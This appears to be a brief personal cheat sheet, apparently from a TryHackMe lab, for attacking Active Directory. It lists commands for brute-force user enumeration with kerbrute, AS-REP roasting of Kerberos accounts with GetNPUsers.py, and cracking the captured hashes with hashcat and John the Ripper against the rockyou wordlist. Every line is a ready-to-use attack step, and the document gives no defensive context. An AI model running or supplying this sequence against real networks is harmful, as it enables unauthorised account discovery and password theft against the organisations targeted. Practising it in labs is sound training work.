## brute force discovery of users
kerbrute userenum -d <domain.local> --dc <dc_ip> <my_wordlist>

## query ASReproastable accounts from the Key Distribution Center
GetNPUsers.py -outputfile <output_file> -usersfile <wordlist> -dc-ip <dc_ip> <domain/>
e.g
python3 GetNPUsers.py -outputfile ~/output_file.hash -usersfile ~/wordlist.txt  -dc-ip 10.10.2.185 THM-AD/ 

## crack with hashcat
hashcat -m 18200 hash pass

## crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep hash


